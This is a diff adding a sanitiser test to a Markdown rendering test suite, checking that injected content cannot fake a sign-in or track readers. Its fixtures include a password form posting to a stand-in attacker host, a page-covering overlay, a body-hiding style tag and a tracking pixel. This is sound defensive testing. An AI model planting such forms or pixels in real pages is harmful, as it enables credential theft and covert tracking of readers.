@@ -56,6 +56,25 @@ describe("Markdown is sanitised (SEC-05)", () => {
     expect(html).not.toMatch(/onerror|onclick/i);
     expect(html).not.toMatch(/javascript:/i);
   });
+
+  it("[SEC-05][SEC-09] a text cannot imitate a sign-in, cover the page or track its readers", () => {
+    const html = renderMarkdown(
+      [
+        '<form action="https://evil.example/steal"><input type="password"><button>Anmelden</button></form>',
+        "",
+        '<div style="position:fixed;inset:0">Überdeckt</div>',
+        "",
+        "<style>body { display: none }</style>",
+        "",
+        "![Pixel](https://evil.example/p.gif) ![Logo](/assets/logo.png)",
+      ].join("\n"),
+    );
+    expect(html).not.toMatch(/<form|<input|<button|<style|style=/i);
+    expect(html).not.toContain("evil.example");
+    // Text stays, and images of this site too.
+    expect(html).toContain("Überdeckt");
+    expect(html).toContain('src="/assets/logo.png"');
+  });
 });
 
 describe("the privacy notice page (SEC-09)", () => {
